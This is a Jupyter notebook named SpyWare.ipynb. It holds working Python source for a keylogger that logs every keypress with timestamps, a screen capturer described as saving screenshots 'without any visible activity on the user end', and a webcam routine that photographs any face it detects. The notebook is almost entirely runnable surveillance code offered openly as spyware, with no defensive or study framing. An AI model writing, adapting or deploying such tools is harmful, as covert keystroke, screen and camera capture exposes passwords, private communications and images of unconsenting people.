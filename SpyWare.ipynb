{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Key Logger Source Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard  # using module keyboard\n",
    "from datetime import date\n",
    "import time\n",
    "import pickle\n",
    "import os\n",
    "\n",
    "def keyLogger(exit_key, filename, loc = os.getcwd()):\n",
    "    '''\n",
    "    Parameters:\n",
    "    exit_key - Key upon pressing which, the program stops eg. 'esc'\n",
    "    filename - Name of the file where you want to store the data.\n",
    "    loc - Location where you want to save the file, by default it saves it to the present working directory.\n",
    "    \n",
    "    Output:\n",
    "    Gives the data of all the keys presses along with time_stamp and stores it in the user specified location.\n",
    "    Format: KeyEvent - yyyy/dd/mm -- hr:min:sec\n",
    "    \n",
    "    '''\n",
    "    if loc != os.getcwd():\n",
    "        os.chdir(loc)\n",
    "    else:\n",
    "        pass\n",
    "    \n",
    "    file = open(filename, 'w') ## Choose a name of your choice\n",
    "    record = keyboard.record(until=exit_key)\n",
    "        \n",
    "    for events in record:\n",
    "        date_stamp = date.today()\n",
    "        file.write(str(events)[13:]+' - '+str(date_stamp)+' -- '+str(time.localtime().tm_hour)+':'+str(time.localtime().tm_min)+':'+str(time.localtime().tm_sec))\n",
    "        file.write('\\n')\n",
    "        \n",
    "    file.close()\n",
    "    \n",
    "#eg.\n",
    "keyLogger('esc', 'KeyLog.txt')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Screen Capture Source Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "import PIL.ImageGrab as capture\n",
    "import time\n",
    "from datetime import date\n",
    "import os\n",
    "        \n",
    "def screenCapture(max_num = 50, interval = 60, loc = os.getcwd()):\n",
    "    '''\n",
    "    Parameters:\n",
    "    max_num - Maximum number of images to be taken. Default value is set to 50 images.\n",
    "    interval - Time interval between successive screen captures in seconds. Default value is 60 seconds.\n",
    "    loc - Location to save the screenshots. Default value is present working directory.\n",
    "    \n",
    "    Output:\n",
    "    Stores screen captures to the desired location without any visible activity on the user end.\n",
    "    '''\n",
    "    \n",
    "    start_shot = time.time()\n",
    "    end_shot = time.time()\n",
    "    imageNum = 0\n",
    "    \n",
    "    if loc != os.getcwd():\n",
    "        os.chdir(loc)\n",
    "    else:\n",
    "        pass\n",
    "    \n",
    "    while(imageNum < max_num):\n",
    "        \n",
    "        end_shot = time.time()\n",
    "        if (end_shot - start_shot > interval): # Interval between successive screenshots\n",
    "            img = capture.grab()\n",
    "            \n",
    "            # Uncomment the below line if you want to see the screenshots as they are being taken\n",
    "            ## img.show()\n",
    "            \n",
    "            imageNum += 1\n",
    "            start_shot = time.time()\n",
    "            end_shot = time.time()\n",
    "            img.save('Image-' + str(imageNum) + '-' + str(date.today()) + '.jpg')\n",
    "\n",
    "# e.g.\n",
    "screenCapture(3, 2, loc = 'D:')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Face Detecting Intruder Capture Source Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import cv2\n",
    "import PIL\n",
    "import time\n",
    "import os\n",
    "from datetime import date\n",
    "\n",
    "def intruderCamCapture(waitTime = 10, loc = os.getcwd()):\n",
    "    '''\n",
    "    Parameters:\n",
    "    waitTime - The time to wait between successive intruder checks in seconds. Default is ten seconds.\n",
    "    loc - Location to save the captures. Default value is present working directory.\n",
    "    \n",
    "    Output:\n",
    "    Stores screen captures to the desired location without any visible activity on the user end.\n",
    "    Warning - The web cam light will activate upon execution of the code.\n",
    "    '''\n",
    "    \n",
    "    cap = cv2.VideoCapture(0)\n",
    "    \n",
    "    # Modify file path according to your preffered storage location\n",
    "    face_cascade = cv2.CascadeClassifier('D:\\\\Python files\\\\haarcascade files\\\\haarcascade_frontalface_alt.xml')\n",
    "\n",
    "    img_count = 0\n",
    "\n",
    "    ## Keeping track of the time\n",
    "    start = time.time()\n",
    "    end = time.time()\n",
    "\n",
    "    while True:\n",
    "\n",
    "        ## Detecting face\n",
    "        end = time.time()\n",
    "        _, image = cap.read()\n",
    "        image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n",
    "        faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)\n",
    "        for x, y, width, height in faces:\n",
    "            cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)\n",
    "\n",
    "        # Why capture when there is no one in front of the camera\n",
    "        if len(faces) > 0 and end - start > waitTime:\n",
    "            \n",
    "            if loc != os.getcwd():\n",
    "                os.chdir(loc)\n",
    "            else:\n",
    "                pass\n",
    "            \n",
    "            filename = 'CamImage-' + str(img_count) + '-' + str(date.today()) + '.jpg'\n",
    "\n",
    "            # Saving Image and updating time\n",
    "            cv2.imwrite(filename, image)\n",
    "            img_count += 1\n",
    "            start = time.time()\n",
    "            end = time.time()\n",
    "\n",
    "        #### Optional - Used for testing purposes\n",
    "\n",
    "        cv2.imshow('Capture', image)\n",
    "        if cv2.waitKey(1) == ord(\"q\"): # Press 'q' to halt the program\n",
    "            break\n",
    "\n",
    "        #### Warning - removing the above 'break' code will generate infinite loop\n",
    "\n",
    "    cap.release()\n",
    "    cv2.destroyAllWindows()\n",
    "    \n",
    "# e.g.\n",
    "intruderCamCapture(5, 'C:\\\\Users\\\\Hetav Pandya\\\\SpyCaptures')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    Parameters:\n",
      "    waitTime - The time to wait between successive intruder checks in seconds. Default is ten seconds\n",
      "    loc - Location to save the captures. Default value is present working directory.\n",
      "    \n",
      "    Output:\n",
      "    Stores screen captures to the desired location without any visible activity on the user end.\n",
      "    Warning - The web cam light will activate upon execution of the code\n",
      "    \n"
     ]
    }
   ],
   "source": [
    "print(intruderCamCapture.__doc__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
